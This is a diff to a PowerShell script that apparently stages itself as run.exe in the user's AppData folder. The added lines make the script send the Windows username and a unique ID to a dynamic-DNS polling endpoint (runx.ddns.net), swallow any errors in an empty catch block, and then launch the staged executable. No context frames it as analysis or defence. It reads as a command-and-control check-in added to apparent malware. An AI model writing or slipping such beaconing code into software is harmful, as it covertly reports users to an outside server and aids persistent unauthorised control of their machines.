@@ -1,5 +1,6 @@
 $ErrorActionPreference = "Continue"
 
+$VPS_POLL_URL = "http://runx.ddns.net/api/poll"
 $self = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
 $runDir = "$env:APPDATA\run"
 $runExe = "$runDir\run.exe"
@@ -159,7 +160,17 @@ else {
 
 $uniqueUser = "$($env:USERNAME)-$uniqueId-W"
 
+try {
+	$registerUrl = $VPS_POLL_URL + "?username=" + $uniqueUser
+	$testUri = [System.Uri]$registerUrl
 
+	Invoke-RestMethod `
+		-Method Get `
+		-Uri $registerUrl `
+		-ErrorAction Stop | Out-Null
+}
+catch {
+}
 
 Start-Process `
 	-FilePath $runExe
